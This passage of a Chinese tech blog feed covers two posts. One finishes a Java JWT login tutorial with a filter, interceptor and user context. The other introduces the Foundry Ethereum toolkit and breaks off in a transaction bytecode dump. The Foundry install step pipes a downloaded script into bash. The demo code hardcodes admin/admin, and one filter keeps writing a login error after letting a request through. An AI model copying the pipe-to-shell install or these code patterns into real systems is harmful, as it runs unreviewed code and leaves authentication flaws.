JWt</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generate</span><span class="params">(String userName)</span></span>&#123;</span><br><span class="line">        <span class="comment">//过期时间</span></span><br><span class="line">        Date expirDate = <span class="keyword">new</span> Date(System.currentTimeMillis() + EXPIRATION.toMillis());</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .setSubject(userName) <span class="comment">//将 userName 放进 JWT</span></span><br><span class="line">                .setIssuedAt(<span class="keyword">new</span> Date()) <span class="comment">//设置JWT签发时间</span></span><br><span class="line">                .setExpiration(expirDate) <span class="comment">//设置过期时间</span></span><br><span class="line">                .signWith(SignatureAlgorithm.HS512,SECRET_KEY) <span class="comment">//设置加密算法和密钥</span></span><br><span class="line">                .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解析JWT</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Claims <span class="title">parse</span><span class="params">(String token)</span></span>&#123;</span><br><span class="line">        <span class="comment">//如果是空字符串则返回null</span></span><br><span class="line">        <span class="keyword">if</span>(Strings.isEmpty(token))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Claims对象包含了许多属性，比如签发时间、过期时间以及存放的数据等</span></span><br><span class="line">        Claims claims = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 解析失败会抛出异常。token过期、token非法都会导致解析失败</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            claims = Jwts.parser()</span><br><span class="line">                    .setSigningKey(SECRET_KEY)</span><br><span class="line">                    .parseClaimsJws(token)</span><br><span class="line">                    .getBody();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (JwtException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;解析失败！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> claims;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>工具类做好之后我们可以开始写登录接口了，和之前大同小异：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;jwtLogin&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 判断账号密码是否正确</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(user.getUsername()) &amp;&amp; <span class="string">&quot;admin&quot;</span>.equals(user.getPassword())) &#123;</span><br><span class="line">            <span class="comment">// 如果正确的话就返回生成的token（注意哦，这里服务端是没有存储任何东西的）</span></span><br><span class="line">            <span class="keyword">return</span> JwtUtil.generate(user.getUsername());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;登录失败，账号密码错误&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在后续的会话中，用户访问其他接口时可以校验<code>token</code>来判断是否已经登录。前端将<code>token</code>一般会放在请求头的<code>Authorization</code>项传递过来，其格式一般为<code>类型 + token</code>。</p><p>写一个测试接口：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;JwtApi&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">api</span><span class="params">(HttpServletRequest request)</span></span>&#123;</span><br><span class="line">        <span class="comment">//从请求头中获取token字符串</span></span><br><span class="line">        String jwt = request.getHeader(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line">        <span class="comment">//解析失败则提示用户登录</span></span><br><span class="line">        <span class="keyword">if</span>(JwtUtil.parse(jwt) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;请先登录&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204192602294.png" alt="image-20230204192602294"></p><p>登录后可以获取到token，将这个token设置到请求头中再调用接口：</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204192747706.png" alt="image-20230204192747706"></p><h4 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h4><p>和 <code>session</code>一样做一个过滤器做统一处理</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebFilter(filterName = &quot;loginCheckFilter&quot;,urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginCheckFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="comment">//路径匹配器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> AntPathMatcher PATH_PATTERN = <span class="keyword">new</span> AntPathMatcher();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest)servletRequest;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取本次请求的URI</span></span><br><span class="line">        String requestURI = request.getRequestURI();</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;拦截到的请求：&#123;&#125;&quot;</span>,requestURI);</span><br><span class="line"></span><br><span class="line">        String[] urls = <span class="keyword">new</span> String[]&#123;</span><br><span class="line">                <span class="string">&quot;/jwtLogin/**&quot;</span>,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.判断本次请求是否需要处理</span></span><br><span class="line">        <span class="keyword">boolean</span> check = check(urls,requestURI);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.如果不需要处理，则直接放行</span></span><br><span class="line">        <span class="keyword">if</span>(check)&#123;</span><br><span class="line">            log.info(<span class="string">&quot;本次请求不需要处理：&#123;&#125;&quot;</span>,requestURI);</span><br><span class="line">            filterChain.doFilter(request,response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从请求头中获取token字符串并解析</span></span><br><span class="line">        Claims claims = JwtUtil.parse(request.getHeader(<span class="string">&quot;Authorization&quot;</span>));</span><br><span class="line">        <span class="comment">// 已登录就直接放行</span></span><br><span class="line">        <span class="keyword">if</span> (claims != <span class="keyword">null</span>) &#123;</span><br><span class="line">            filterChain.doFilter(request,response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置响应数据类型为json（前后端分离）</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json;charset=utf-8&quot;</span>);</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        <span class="comment">// 设置响应内容，结束请求</span></span><br><span class="line">        out.write(<span class="string">&quot;请先登录&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 路径匹配，检查本次请求是否需要方放行</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> requestURI</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> urls</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String[] urls, String requestURI)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(String url : urls)&#123;</span><br><span class="line">            <span class="keyword">boolean</span> match = PATH_PATTERN.match(url,requestURI);</span><br><span class="line">            <span class="keyword">if</span>(match)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重启服务器使拦截器生效：</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204201125311.png" alt="image-20230204201125311"></p><h4 id="上下文对象-1"><a href="#上下文对象-1" class="headerlink" title="上下文对象"></a>上下文对象</h4><p><code>JWT</code>无法把用户信息直接存储起来，所以<code>JWT</code>的上下文对象要靠我们自己来实现。</p><p>首先需要定义一个上下文类，这个类专门存储<code>JWT</code>解析出来的用户信息，需要用到<code>ThreadLocal</code>,以防止线程冲突。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserContext</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;String&gt; user = <span class="keyword">new</span> ThreadLocal&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(String userName)</span></span>&#123;</span><br><span class="line">        user.set(userName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        user.remove();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 当前登录用户的用户名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getCurrentUserName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> user.get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后修改一下拦截器：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 简单的白名单，登录这个接口直接放行</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;/jwtLogin&quot;</span>.equals(request.getRequestURI())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从请求头中获取token字符串并解析</span></span><br><span class="line">        Claims claims = JwtUtil.parse(request.getHeader(<span class="string">&quot;Authorization&quot;</span>));</span><br><span class="line">        <span class="comment">// 已登录就直接放行</span></span><br><span class="line">        <span class="keyword">if</span> (claims != <span class="keyword">null</span>) &#123;</span><br><span class="line">            UserContext.add(claims.getSubject());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 走到这里就代表是其他接口，且没有登录</span></span><br><span class="line">        <span class="comment">// 设置响应数据类型为json（前后端分离）</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json;charset=utf-8&quot;</span>);</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        <span class="comment">// 设置响应内容，结束请求</span></span><br><span class="line">        out.write(<span class="string">&quot;请先登录&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改<code>SpringBoot</code>启动类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtApplication</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(JwtApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使拦截器生效</span></span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> LoginInterceptor());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样一个上下文对象就做好了，用法和之前一样，可以在程序的其他地方直接获取到数据，我们在Service层中来使用它：</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204204329834.png" alt="image-20230204204329834"></p><h3 id="session-与-JWT-的优劣"><a href="#session-与-JWT-的优劣" class="headerlink" title="session 与 JWT 的优劣"></a>session 与 JWT 的优劣</h3><p><strong>优点：</strong></p><ul><li><p>session</p><ol><li>开箱即用，简单方便</li><li>可以有效管理用户登录的状态，如续期，销毁等</li></ol></li><li><p>JWT</p><ol><li>可以直接解析数据，服务端不用存储数据</li><li>有利于水平扩展，如多个系统可以使用同一个 Token 进行登录</li></ol></li></ul><p><strong>缺点：</strong></p><ul><li><p>session</p><p>需要额外存储数据</p></li><li><p>JWT</p><ol><li><code>JWT</code>签名的长度远比一个 <code>Session Id</code>长很多，增加额外网络开销</li><li>无法销毁、续期登录状态</li><li>密钥一旦被泄漏，攻击者就可以伪造 Token</li></ol></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>JWT</code>根据<code>secretKey</code>会生成一个独特的字符串，别人没有这个秘钥的话是无法伪造或篡改<code>JWT</code>的，另外<code>JWT</code>不能存放密码等敏感信息，因为<code>JWT</code>只能防止被篡改，不能防止别人解密你这个字符串。</p><p>例如通过<a href="https://jwt.io/%E8%A7%A3%E5%AF%86%60JWT%60%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9A">https://jwt.io/解密`JWT`字符串：</a></p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204205322774.png" alt="image-20230204205322774"></p><p>文章中的代码放在：<a href="https://github.com/Banannna69/JavaAuthorization">https://github.com/Banannna69/JavaAuthorization</a></p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/EZEh_d4DtKme-xBuKEpK8w">【在用安全框架前，我想先让你手撸一个登陆认证】</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;登录认证，估计是所有系统中最常见的功能了，并且也是最基础、最重要的功能。为了做好这一块而诞生了许多安全框架，比如最常见的Shiro、Spri</summary>
      
    
    
    
    
    <category term="Java" scheme="https://banana69.site/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Foundry 框架使用</title>
    <link href="https://banana69.site/2023/02/03/Foundry/"/>
    <id>https://banana69.site/2023/02/03/Foundry/</id>
    <published>2023-02-03T14:12:01.000Z</published>
    <updated>2023-02-04T14:03:25.476Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Foundry-介绍"><a href="#Foundry-介绍" class="headerlink" title="Foundry 介绍"></a>Foundry 介绍</h3><p>Foundry是 一个用 Rust编写的用于以太坊应用程序开发的极快、可移植和模块化的工具包 ( Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.)</p><p> Foundry 作为 以太坊（Solidity语言）项目/应用程序开发的 “工程化” 工具，提供专业 Solidity 开发环境与“工具链”。<strong>通过它你可以快速、方便的完成依赖项管理、编译、运行测试、部署，并可以通过命令行和 Solidity 脚本与链进行交互</strong>，其利用 <a href="https://github.com/gakonst/ethers-rs/tree/master/ethers-solc/">ethers-solc</a> 比较于传统通过 Node.js 辅助完成的测试用例/工程，Foundry 构建、测试的执行速度很快。</p><h3 id="Foundry-组成"><a href="#Foundry-组成" class="headerlink" title="Foundry 组成"></a>Foundry 组成</h3><p>Foundry 项目由 <code>Forge</code>, <code>Cast</code>, <code>Anvil</code> 几个部分（命令行工具）组成</p><ul><li>Forge: Foundry 项目中<strong>执行初始化项目、管理依赖、测试、构建、部署智能合约</strong>的命令行工具;</li><li>Cast: Foundry 项目中<strong>与 RPC 节点交互</strong>的命令行工具。可以进行智能合约的调用、发送交易数据或检索任何类型的链上数据;</li><li>Anvil: Foundry 项目中<strong>启动的本地测试网/节点</strong>的命令行工具。可以使用它配合测试前端应用与部署在该测试网的合约或通过 RPC 进行交互;</li></ul><h3 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h3><p>通过脚本安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -L https://foundry.paradigm.xyz | bash</span><br><span class="line">foundryup</span><br></pre></td></tr></table></figure><p>初始化Foundry项目</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge init hello</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202161110084.png" alt="image-20230202161110084"></p><p>目录结构：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tree -L 2 </span><br><span class="line">.</span><br><span class="line">├── foundry.toml        # Foundry 的 package 配置文件</span><br><span class="line">├── lib                 # Foundry 的依赖库</span><br><span class="line">│   └── forge-std       # 工具 forge 的基础依赖</span><br><span class="line">├── script              # Foundry 的脚本</span><br><span class="line">│   └── Counter.s.sol   # 示例合约 Counter 的脚本</span><br><span class="line">├── src                 # 智能合约的业务逻辑、源代码将会放在这里</span><br><span class="line">│   └── Counter.sol     # 示例合约</span><br><span class="line">└── test                # 测试用例目录</span><br><span class="line">    └── Counter.t.sol   # 示例合约的测试用例</span><br></pre></td></tr></table></figure><ul><li><p>src 目录</p><p>存放合约文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Counter &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line"></span><br><span class="line">    //设置变量内容</span><br><span class="line">    function setNumber(uint256 newNumber) public &#123;</span><br><span class="line">        number = newNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //number自增</span><br><span class="line">    function increment() public &#123;</span><br><span class="line">        number++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>script 目录</p><p>该目录主要由“部署”脚本构成（也可通过该脚本调用 Foundry 提供的 <code>vm</code> 功能实现应用业务逻辑之外的高级功能，等同于 Hardhat.js 中的 scripts）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &quot;../src/Counter.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract CounterScript is Script &#123;</span><br><span class="line">    //可选函数，在每个函数运行之前被调用</span><br><span class="line">    function setUp() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">    //部署时会调用run函数</span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast(); // 开始部署</span><br><span class="line">        new Counter(); // 创建合约</span><br><span class="line">        vm.stopBroadcast(); // 结束部署</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Foundry的部署脚本是一个用Solidity写的智能合约，虽然它不会被部署，但符合Solidity的规范。你可以用<code>forge script</code>运行脚本并部署合约。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge script script/Counter.s.sol:CounterScript</span><br></pre></td></tr></table></figure></li><li><p>test 目录</p><p>test 目录主要存放合约的测试用例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;; // 引入 forge-std 中用于测试的依赖</span><br><span class="line">import &quot;../src/Counter.sol&quot;; // 引入用于测试的业务合约</span><br><span class="line"></span><br><span class="line">contract CounterTest is Test &#123;</span><br><span class="line">    Counter public counter;</span><br><span class="line"></span><br><span class="line">    // 初始化测试用例</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        counter = new Counter();</span><br><span class="line">        counter.setNumber(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 基于初始化测试用例</span><br><span class="line">    // 断言测试自增后的 counter 的 number 返回值 同等于 1</span><br><span class="line">    function testIncrement() public &#123;</span><br><span class="line">        counter.increment();</span><br><span class="line">        assertEq(counter.number(), 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 基于初始化测试用例</span><br><span class="line">    // 执行差异测试</span><br><span class="line">    // forge 测试的过程中</span><br><span class="line">    // 为 testSetNumber 函数参数传递不同的 unit256 类型的 x</span><br><span class="line">    // 达到测试 counter 的 setNumber 函数 为不同的 x 设置不同的数</span><br><span class="line">    // 断言 number() 的返回值等同于差异测试的 x 参数</span><br><span class="line">    function testSetNumber(uint256 x) public &#123;</span><br><span class="line">        counter.setNumber(x);</span><br><span class="line">        assertEq(counter.number(), x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>构建执行&amp;测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge build</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202162153359.png" alt="image-20230202162153359"></p><p>完成构建后 通过 <code>forge test</code> 完成测试</p><p><img src="/image/Foundry.assets/image-20230202162210346.png" alt="image-20230202162210346"></p></li></ul><h3 id="Foundry-Cast的使用"><a href="#Foundry-Cast的使用" class="headerlink" title="Foundry Cast的使用"></a>Foundry Cast的使用</h3><h5 id="查询区块："><a href="#查询区块：" class="headerlink" title="查询区块："></a>查询区块：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># $PRC_MAIN 替换成需要的RPC地址</span><br><span class="line">cast block-number --rpc-url=$RPC_MAIN</span><br><span class="line"># 可以设置环境变量的ETH_PRC_URL</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202162352898.png" alt="image-20230202162352898"></p><h5 id="查询区块信息"><a href="#查询区块信息" class="headerlink" title="查询区块信息"></a>查询区块信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast block 31 --rpc-url=http://127.0.0.1:7545</span><br><span class="line">//格式化输出 block 31  --json --rpc-url=http://127.0.0.1:7545</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202162623074.png" alt="image-20230202162623074"></p><h5 id="查询交易"><a href="#查询交易" class="headerlink" title="查询交易"></a>查询交易</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 跟ethersjs中的 provider.getTransaction 类似</span><br><span class="line">cast tx &lt;HASH&gt; [FIELD] --rpc-url=$RPC</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">blockHash            0xad0e662c227391bc44cf7308c3a600d00f6964a88f16804710b37620183de84f</span><br><span class="line">blockNumber          31</span><br><span class="line">from                 0x6DFCab7cfD1BA8915c4256eaaA4A494Ca8062C18</span><br><span class="line">gas                  881868</span><br><span class="line">gasPrice             20000000000</span><br><span class="line">hash                 0x63b8b5f61940e9e63b4b02835342e5794f522df0b0b62bff6e8a554ca7766a11</span><br><span class="line">input                0x60806040526012600560006101000a81548160ff021916908360ff1602179055503480156200002d57600080fd5b5060405162001166380380620011668339818101604052810190620000539190620001bb565b81600390805190602001906200006b9291906200008d565b508060049080519060200190620000849291906200008d565b505050620003c4565b8280546200009b90620002d5565b90600052602060002090601f016020900481019282620000bf57600085556200010b565b82601f10620000da57805160ff19168380011785556200010b565b828001600101855582156200010b579182015b828111156200010a578251825591602001919060010190620000ed565b5b5090506200011a91906200011e565b5090565b5b80821115620001395760008160009055506001016200011f565b5090565b6000620001546200014e8462000269565b62000240565b905082815260208101848484011115620001735762000172620003a4565b5b620001808482856200029f565b509392505050565b600082601f830112620001a0576200019f6200039f565b5b8151620001b28482602086016200013d565b91505092915050565b60008060408385031215620001d557620001d4620003ae565b5b600083015167ffffffffffffffff811115620001f657620001f5620003a9565b5b620002048582860162000188565b925050602083015167ffffffffffffffff811115620002285762000227620003a9565b5b620002368582860162000188565b9150509250929050565b60006200024c6200025f565b90506200025a82826200030b565b919050565b6000604051905090565b600067ffffffffffffffff82111562000287576200028662000370565b5b6200029282620003b3565b9050602081019050919050565b60005b83811015620002bf578082015181840152602081019050620002a2565b83811115620002cf576000848401525b50505050565b60006002820490506001821680620002ee57607f821691505b6020821081141562000305576200030462000341565b5b50919050565b6200031682620003b3565b810181811067ffffffffffffffff8211171562000338576200033762000370565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b610d9280620003d46000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c806342966c681161007157806342966c681461016857806370a082311461018457806395d89b41146101b4578063a0712d68146101d2578063a9059cbb146101ee578063dd62ed3e1461021e576100a9565b806306fdde03146100ae578063095ea7b3146100cc57806318160ddd146100fc57806323b872dd1461011a578063313ce5671461014a575b600080fd5b6100b661024e565b6040516100c39190610b02565b60405180910390f35b6100e660048036038101906100e19190610a14565b6102dc565b6040516100f39190610ae7565b60405180910390f35b6101046103ce565b6040516101119190610b24565b60405180910390f35b610134600480360381019061012f91906109c1565b6103d4565b6040516101419190610ae7565b60405180910390f35b610152610583565b60405161015f9190610b3f565b60405180910390f35b610182600480360381019061017d9190610a54565b610596565b005b61019e60048036038101906101999190610954565b61066d565b6040516101ab9190610b24565b60405180910390f35b6101bc610685565b6040516101c99190610b02565b60405180910390f35b6101ec60048036038101906101e79190610a54565b610713565b005b61020860048036038101906102039190610a14565b6107ea565b6040516102159190610ae7565b60405180910390f35b61023860048036038101906102339190610981565b610905565b6040516102459190610b24565b60405180910390f35b6003805461025b90610c88565b80601f016020809104026020016040519081016040528092919081815260200182805461028790610c88565b80156102d45780601f106102a9576101008083540402835291602001916102d4565b820191906000526020600020905b8154815290600101906020018083116102b757829003601f168201915b505050505081565b600081600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040516103bc9190610b24565b60405180910390a36001905092915050565b60025481565b600081600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546104629190610bcc565b92505081905550816000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546104b79190610bcc565b92505081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461050c9190610b76565b925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516105709190610b24565b60405180910390a3600190509392505050565b600560009054906101000a900460ff1681565b806000803373ffffffffffffffffffffffffffffffffffffffff1673fffffffffff